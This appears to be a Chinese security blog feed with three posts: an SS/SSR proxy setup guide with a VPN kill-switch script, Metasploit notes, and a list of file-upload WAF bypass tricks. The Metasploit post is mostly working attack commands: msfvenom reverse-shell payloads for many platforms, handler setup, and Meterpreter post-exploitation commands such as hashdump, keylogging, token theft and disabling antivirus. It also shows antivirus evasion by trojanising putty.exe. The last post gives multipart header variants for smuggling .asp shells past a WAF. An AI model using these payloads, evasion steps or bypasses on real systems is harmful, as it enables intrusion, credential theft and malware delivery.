<h3 id="0x01-SS-SSR服务器端"><a href="#0x01-SS-SSR服务器端" class="headerlink" title="0x01 SS\SSR服务器端"></a>0x01 SS\SSR服务器端</h3><p>　　SS\SSR服务器端搭建比较简单，一般都有一键部署模式，而且网上的资料也比较多，这里就不多介绍咯。<br>　　具体搭建方法可以参考以下：<a href="https://blog.csdn.net/qq_26483671/article/details/79268195" target="_blank" rel="external">参考1</a><a href="https://www.yigeni.com/build-a-wall-ss-server/" target="_blank" rel="external">参考2</a><a href="https://blog.csdn.net/zoe9698/article/details/79025848" target="_blank" rel="external">参考3</a></p>
<h3 id="0x02-SS-SSR客户端"><a href="#0x02-SS-SSR客户端" class="headerlink" title="0x02 SS\SSR客户端"></a>0x02 SS\SSR客户端</h3><p>　　服务器端配置好之后，我们只需要配置客户端就可以了，SS\SSR配置都差不多，这里主要讲SSR的一些步骤。客户端下载：</p>
<p><a href="https://share.weiyun.com/4222c15ffbe1a09b477cb92d2f5fc619" target="_blank" rel="external">Win下载</a><br><a href="https://share.weiyun.com/aecdc5371c2af66f14aa2f029c0651ee" target="_blank" rel="external">Mac下载</a><br><a href="https://share.weiyun.com/6c766c04a22ab0daf50d4d728b3af4ee" target="_blank" rel="external">安卓下载</a></p>
<h4 id="1、添加服务器（节点）"><a href="#1、添加服务器（节点）" class="headerlink" title="1、添加服务器（节点）"></a>1、添加服务器（节点）</h4><p>　　双击SSR程序后，屏幕右下角会出现小飞机图标，鼠标右键单击小飞机图标，点开编辑服务器<br><img src="https://upload-images.jianshu.io/upload_images/3946186-95432c8cc5df252b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/463" alt=""></p>
<h4 id="2、根据节点配置"><a href="#2、根据节点配置" class="headerlink" title="2、根据节点配置"></a>2、根据节点配置</h4><p>　　把配置信息填入到框内，最好把节点命名，否则沟通的时候会造成混乱。密码与IP前面的选择框是明文显示的意思，服务器ip尽量手打！！！！<br><img src="https://upload-images.jianshu.io/upload_images/3946186-abf7cb416537db7d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt=""></p>
<h4 id="3、开启代理"><a href="#3、开启代理" class="headerlink" title="3、开启代理"></a>3、开启代理</h4><p>　　直连模式为关闭代理，全局模式为打开代理，打开全局模式后就可以访问Google，Youtube了。<br><img src="https://upload-images.jianshu.io/upload_images/3946186-b6d11261c9d1e4c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/430" alt=""></p>
<h4 id="4、切换节点"><a href="#4、切换节点" class="headerlink" title="4、切换节点"></a>4、切换节点</h4><p>　　红框中对勾表示目前正在使用的节点，想切换节点就单击选择其他节点。<br><img src="https://upload-images.jianshu.io/upload_images/3946186-1ff3e89ca501c5b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/522" alt=""></p>
<h3 id="0x03-彩蛋"><a href="#0x03-彩蛋" class="headerlink" title="0x03 彩蛋"></a>0x03 彩蛋</h3><p>　　我们在渗透测试的时候，常常需要用到代理或者VPN，但是有的时候我们的测试的时候突然VPN掉线，可是我们还沉浸在自己的工作中，结果真实IP以及走出去了，过不了几天被查了水表，这个情况我们也是经常遇到。我们可以买一个专业的VPN，具有掉线即可断网的功能，但是资金有昂贵，还需要有一个VPS公网IP，这两个下来就是一大笔开销，作为穷苦人家的我连VPS都快买不起，更何况VPN。于是就找到了一种使用VPS做全局代理，掉线即可断网的基本目的。<br>　　介绍一款Windows下比较好用的代理工具Sstap，<a href="https://pan.baidu.com/s/1qYyunZe" target="_blank" rel="external">链接</a>、密码: fiy4，支持HTTP、SOCKS4、SOCKS5、SS、SSR等代理，模式有全局模式等几种。<br><img src="http://obh1qcqek.bkt.clouddn.com/18-7-23/44701059.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">import msvcrt </div><div class="line">import time</div><div class="line">import os</div><div class="line">x=0</div><div class="line">print u&quot;按[q]键退出&quot;</div><div class="line">vpn=os.popen(&quot;ipconfig&quot;).read()</div><div class="line">print len(vpn)</div><div class="line"></div><div class="line">#判断是否连接VPN</div><div class="line">if len(vpn)!=1901:</div><div class="line">    print u&quot;还未连接vpn&quot;</div><div class="line">else:</div><div class="line">    x=1</div><div class="line">    print u&quot;连接vpn成功&quot;</div><div class="line"></div><div class="line">while x:</div><div class="line">    key=&quot;&quot;</div><div class="line">    time.sleep(0.1)</div><div class="line">    if msvcrt.kbhit():</div><div class="line">        key=msvcrt.getch()</div><div class="line">    vpn=os.popen(&quot;ipconfig&quot;).read()</div><div class="line">    if(len(vpn)!=1901):                </div><div class="line">        os.popen(&quot;ipconfig /release&quot;).read() #释放IP</div><div class="line">        print u&quot;Vpn已断开！！&quot;</div><div class="line">        opt=raw_input(&quot;NIC is disabled, need to be enabled ?(y/n):&quot;)</div><div class="line">        if opt==&apos;y&apos;:</div><div class="line">            os.popen(&quot;ipconfig /renew&quot;).read() #获取IP</div><div class="line">            print u&quot;网卡已启用&quot;</div><div class="line">        exit(1)</div><div class="line">    else:</div><div class="line">        print u&quot;第%d次检测：VPN状态OK!&quot;%(x)</div><div class="line">    x+=1</div><div class="line">    if key==&quot;q&quot;:</div><div class="line">        print &quot;Exiting...&quot;</div><div class="line">        exit(1)</div></pre></td></tr></table></figure>
<p>　　可以使用该脚本监测代理的运行情况，如果掉线，就会释放IP，继而断网。但是有一个问题，断网的那一瞬间可能还会出去，所以可以搭建两层VPN，虚拟机中进行测试，可以有效的防止这一点。<a href="https://lighti.me/1541.html" target="_blank" rel="external">搭建参考</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　如今有时候想出去查点资料，奈何法力不够，肉身翻不出去，于是就找了找相关知识，试试可不可以出去看看。首先我们需要有一个国外的vps，推荐搬瓦工或者Vultr，具体可以&lt;a href=&quot;https://buy.shangyufeidi.com/vultr/vultr-vs-bwg/&quot;&gt;参考&lt;/a&gt;自己进行选择。一般都有一键搭建ss或者ssr，简单方便、傻瓜化教程。&lt;br&gt;
    
    </summary>
    
      <category term="渗透" scheme="https://zjw.dropsec.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://zjw.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit笔记</title>
    <link href="https://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/2018/05/10/Metasploit%E7%AC%94%E8%AE%B0.html"/>
    <id>https://zjw.dropsec.xyz/渗透/2018/05/10/Metasploit笔记.html</id>
    <published>2018-05-10T09:49:38.000Z</published>
    <updated>2018-05-10T10:18:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>　　Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称叫做MSF。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。<br><a id="more"></a></p>
<h2 id="0x01-基本操作"><a href="#0x01-基本操作" class="headerlink" title="0x01 基本操作"></a>0x01 基本操作</h2><h3 id="1、运行"><a href="#1、运行" class="headerlink" title="1、运行"></a>1、运行</h3><p>　　Shell中直接输入msfconsole<br><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/88801847.jpg" alt=""></p>
<h3 id="2、建立搜索缓存（数据库）"><a href="#2、建立搜索缓存（数据库）" class="headerlink" title="2、建立搜索缓存（数据库）"></a>2、建立搜索缓存（数据库）</h3><p>启动PostgreSQL数据库服务 ：service postgresql start 监听5432端口<br>初始化Metasploit数据库 ：msfdb init<br>查看数据库联接情况 ：msfconsole    db_status<br>建立数据库缓存 ：msfconsole    db_rebuild_cache</p>
<h3 id="3、专业术语"><a href="#3、专业术语" class="headerlink" title="3、专业术语"></a>3、专业术语</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">– Exploit，攻击工具/代码 </div><div class="line">– Payload，攻击载荷 </div><div class="line">– Shellcode </div><div class="line">– Module，模块 </div><div class="line">– Listener，监听器</div></pre></td></tr></table></figure>
<h3 id="4、Metasploit主目录"><a href="#4、Metasploit主目录" class="headerlink" title="4、Metasploit主目录"></a>4、Metasploit主目录</h3><p>Kali Linux /usr/share/metasploit-framework</p>
<h3 id="5、常用命令"><a href="#5、常用命令" class="headerlink" title="5、常用命令"></a>5、常用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">show exploits – 查看所有可用的渗透攻击程序代码 </div><div class="line">show auxiliary – 查看所有可用的辅助攻击工具 </div><div class="line">show options – 查看该模块所有可用选项 </div><div class="line">show payloads – 查看该模块适用的所有载荷代码 </div><div class="line">show targets – 查看该模块适用的攻击目标类型</div><div class="line">search – 根据关键字搜索某模块 </div><div class="line">info – 显示某模块的详细信息 </div><div class="line">use – 进入使用某渗透攻击模块 </div><div class="line">back – 回退 </div><div class="line">set/unset – 设置/禁用模块中的某个参数 </div><div class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </div><div class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</div></pre></td></tr></table></figure>
<h2 id="0x02-Metasploit功能程序"><a href="#0x02-Metasploit功能程序" class="headerlink" title="0x02 Metasploit功能程序"></a>0x02 Metasploit功能程序</h2><p><strong>msfvenom</strong> （攻击载荷生成和编码器）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">主要参数：</div><div class="line">-p payload</div><div class="line">-e 编码方式</div><div class="line">-i 编码次数</div><div class="line">-b 在生成的程序中避免出现的值</div><div class="line">LHOST,LPORT 监听上线的主机IP和端口</div><div class="line">-f exe 生成EXE格式</div><div class="line"></div><div class="line">使用msfvenom -l 可以查看可以利用payload</div><div class="line">msfvenom -l | grep windows | grep x64 | grep tcp  选择payload</div></pre></td></tr></table></figure></p>
<h3 id="1、生成可执行文件"><a href="#1、生成可执行文件" class="headerlink" title="1、生成可执行文件"></a>1、生成可执行文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">Linux:</div><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</div><div class="line">Windows:</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</div><div class="line">Mac:</div><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</div><div class="line">PHP:</div><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</div><div class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</div><div class="line">ASP:</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</div><div class="line">JSP:</div><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</div><div class="line">WAR:</div><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</div><div class="line">Python:</div><div class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</div><div class="line">Bash:</div><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</div><div class="line">Perl:</div><div class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</div></pre></td></tr></table></figure>
<h3 id="2、监听"><a href="#2、监听" class="headerlink" title="2、监听"></a>2、监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">set PAYLOAD &lt;Payload name&gt;</div><div class="line">set LHOST &lt;LHOST value&gt;</div><div class="line">set LPORT &lt;LPORT value&gt;</div><div class="line">set ExitOnSession false   让connection保持连接(即使一个连接退出,仍然保持listening状态)</div><div class="line">exploit -j –z  -j(作为job开始运行)和-z(不立即进行session交换--也即是自动后台运行)</div></pre></td></tr></table></figure>
<h3 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=172.16.0.4 LPORT=443 -f exe &gt; abc.exe</div></pre></td></tr></table></figure>
<p><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/25903092.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler</div><div class="line">msf exploit(handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; show options</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/16142225.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">msf exploit(handler) &gt; set LHOST 172.16.0.4</div><div class="line">msf exploit(handler) &gt; set ExitOnSession false</div><div class="line">msf exploit(handler) &gt; exploit -j -z  </div><div class="line">-j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</div><div class="line">msf exploit(handler) &gt; jobs  查看后台攻击任务 </div><div class="line">msf exploit(handler) &gt; kill &lt;id&gt;  停止某后台攻击任务 </div><div class="line">msf exploit(handler) &gt; sessions -l  (查看会话)</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/7100989.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msf exploit(handler) &gt; sessions -i 2   选择会话</div><div class="line">msf exploit(handler) &gt; sessions -k 2   结束会话</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/3673834.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Ctrl+z  把会话放到后台</div><div class="line">Ctrl+c  结束会话</div></pre></td></tr></table></figure></p>
<h2 id="0x03-Meterpreter后攻击"><a href="#0x03-Meterpreter后攻击" class="headerlink" title="0x03 Meterpreter后攻击"></a>0x03 Meterpreter后攻击</h2><p>　　Meterpreter提供的功能包括反追踪、纯内存工作模式、系统 信息获取、密码哈希导出、文件上传下载、屏幕截取、键盘记 录、权限提升、跳板攻击等等。<br><strong>常用命令：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; background  放回后台</div><div class="line">meterpreter &gt; exit  关闭会话</div><div class="line">meterpreter &gt; help  帮助信息</div><div class="line">meterpreter &gt; Sysinfo    系统平台信息</div><div class="line">meterpreter &gt; screenshot  屏幕截取</div><div class="line">meterpreter &gt; shell  命令行shell (exit退出)</div><div class="line">meterpreter &gt; getlwd  查看本地目录</div><div class="line">meterpreter &gt; lcd  切换本地目录</div><div class="line">meterpreter &gt; getwd  查看目录</div><div class="line">meterpreter &gt; ls 查看文件目录列表</div><div class="line">meterpreter &gt; cd  切换目录 </div><div class="line">meterpreter &gt; rm  删除文件 </div><div class="line">meterpreter &gt; download C:\\Users\\123\\Desktop\\1.txt 1.txt 下载文件</div><div class="line">meterpreter &gt; upload /var/www/wce.exe wce.exe  上传文件</div><div class="line">meterpreter &gt; search -d c:  -f *.doc  搜索文件</div><div class="line">meterpreter &gt; execute -f  cmd.exe -i   执行程序/命令 </div><div class="line">meterpreter &gt; ps  查看进程</div><div class="line">meterpreter &gt; run post/windows/capture/keylog_recorder   键盘记录</div><div class="line">meterpreter &gt; getuid  查看当前用户权限</div><div class="line">meterpreter &gt; use priv  加载特权模块</div><div class="line">meterpreter &gt; getsystem  提升到SYSTEM权限</div><div class="line">meterpreter &gt; hashdump  导出密码散列</div><div class="line">meterpreter &gt; ps   查看高权限用户PID</div><div class="line">meterpreter &gt; steal_token &lt;PID&gt;  窃取令牌</div><div class="line">meterpreter &gt; rev2self  恢复原来的令牌 </div><div class="line">meterpreter &gt; migrate pid  迁移进程</div><div class="line">meterpreter &gt; run killav  关闭杀毒软件 </div><div class="line">meterpreter &gt; run getgui-e  启用远程桌面</div><div class="line">meterpreter &gt; portfwd add -l 1234 -p 3389 -r &lt;目标IP&gt;  端口转发</div><div class="line">meterpreter &gt; run get_local_subnets  获取内网网段信息</div><div class="line">meterpreter &gt; run autoroute -s &lt;内网网段&gt;  创建自动路由</div><div class="line">meterpreter &gt; run autoroute -p  查看自动路由表</div><div class="line"></div><div class="line">创建代理通道:</div><div class="line">msf &gt; use auxiliary/server/socks4a   设置socks4代理模块</div><div class="line">msf auxiliary(socks4a) &gt; show options </div><div class="line">msf auxiliary(socks4a) &gt; run</div><div class="line">配置proxychains参数：</div><div class="line">nano /etc/proxychains.conf   修改代理监听端口,和前面端口一致</div><div class="line">quite_mode  设置成安静模式：去掉如下参数前面的注释</div></pre></td></tr></table></figure></p>
<h2 id="0x04-免杀"><a href="#0x04-免杀" class="headerlink" title="0x04 免杀"></a>0x04 免杀</h2><h3 id="1、多次编码免杀"><a href="#1、多次编码免杀" class="headerlink" title="1、多次编码免杀"></a>1、多次编码免杀</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.80.12 LPORT=443 -e x86/shikata_ga_nai-i5 -f exe -o /var/www/html/reverse_http_encode.exe</div></pre></td></tr></table></figure>
<h3 id="2、自定义二进制代码的文件模板免杀"><a href="#2、自定义二进制代码的文件模板免杀" class="headerlink" title="2、自定义二进制代码的文件模板免杀"></a>2、自定义二进制代码的文件模板免杀</h3><p>　　使用“putty.exe”作为文件模板，而且随着putty程序运行而隐蔽同时运行，还使用编码器进行了编码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.80.12 LPORT=443 -e x86/shikata_ga_nai-i5 -x ~/putty.exe -k -f exe -o /var/www/html/reverse_http_putty.exe</div></pre></td></tr></table></figure></p>
<h3 id="3、使用Veil生成免杀代码"><a href="#3、使用Veil生成免杀代码" class="headerlink" title="3、使用Veil生成免杀代码"></a>3、使用Veil生成免杀代码</h3><p>下载地址：<br><a href="https://github.com/Veil-Framework/Veil-Evasion" target="_blank" rel="external">https://github.com/Veil-Framework/Veil-Evasion</a> (只集合了Evasion)<br><a href="https://github.com/Veil-Framework/Veil" target="_blank" rel="external">https://github.com/Veil-Framework/Veil</a><br>安装：（建议使用git下载，否则无法更新）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">apt-get -y install git</div><div class="line">git clone https://github.com/Veil-Framework/Veil.git</div><div class="line">cd Veil/</div><div class="line">cd setup</div><div class="line">sudo ./setup.sh -c</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/4263366.jpg" alt=""><br>　　一路回车就行，可能中间或出现让你安装python、ruby、go语言等，默认安装就行<br><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/25659408.jpg" alt=""><br>运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd ~/Veil </div><div class="line">./Veil.py</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/19801339.jpg" alt=""><br>使用Veil-Evasion工具：<br>use Evasion<br><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/74346896.jpg" alt=""><br>列举所有模块：<br>list<br><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/59067905.jpg" alt=""><br>使用某个模块：<br>use <name><br>use c/meterpreter/rev_http.py<br><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/73284084.jpg" alt=""><br>设置变量:<br>set<br><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/61888035.jpg" alt=""><br>生成可执行代码:<br>generate<br><img src="http://obh1qcqek.bkt.clouddn.com/18-5-10/24950190.jpg" alt=""><br>　　接着就是加载msf监听模块，等待用户的上线了。</name></p>
<p>　　msf功能还是十分强大的，是渗透必备神器，可以自定义渗透脚本，更新速度也挺快，这里只是简单记录了他的用法，还有更大的能力等待着各位去开发和挖掘，这个笔记也会在后期慢慢更新，增加新的技能，未完待续。。。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称叫做MSF。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。&lt;br&gt;
    
    </summary>
    
      <category term="渗透" scheme="https://zjw.dropsec.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://zjw.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Metasploit" scheme="https://zjw.dropsec.xyz/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>上传绕过WAF的tips大全</title>
    <link href="https://zjw.dropsec.xyz/CTF/2018/01/14/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87WAF%E7%9A%84tips%E5%A4%A7%E5%85%A8.html"/>
    <id>https://zjw.dropsec.xyz/CTF/2018/01/14/上传绕过WAF的tips大全.html</id>
    <published>2018-01-14T08:51:34.000Z</published>
    <updated>2018-01-14T09:01:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>原始默认状态：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">Content-Disposition: form-data; name=”filepath”; filename=”backlion.asp”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
<a id="more"></a>
<p>突破0，文件名前缀加[0x09]绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">Content-Disposition: form-data; name=”filepath”; filename=”[0x09]backlion.asp”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
<p>突破1，文件名去掉双引号绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">Content-Disposition: form-data; name=”filepath”; filename=backlion.asp</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
<p>突破2，添加一个filename1的文件名参数，并赋值绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">Content-Disposition: form-data; name=”filepath”; filename=”backlion.asp”;filename1=”test.jpg”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
<p>突破3， form变量改成f+orm组合绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">Content-Disposition: f+orm-data; name=”filepath”;filename=”backlion.asp”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
<p>突破4 ，文件名后缀大小写绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.Asp”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
<p>突破5 ，去掉form-data变量绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">ConTent-Disposition: name=”filepath”; filename=”backlion.asp”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
<p>突破6，在Content-Disposition:后添加多个空格 或者在form-data;后添加多个空格绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">ConTent-Disposition: form-data                                 ; name=”filepath”; filename=”backlion.asp”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
<p>或者：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">ConTent-Disposition:                                                                                form-data ; name=”filepath”; filename=”baclion.asp”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
<p>突破7 ，backlion.asp . (空格+.)绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp .”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
<p>突破8 ，“回车换行，绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">——WebKitFormBoundary2smpsxFB3D0KbA7D</div><div class="line">ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp</div><div class="line">”</div><div class="line">Content-Type: text/html</div></pre></td></tr></table></figure></p>
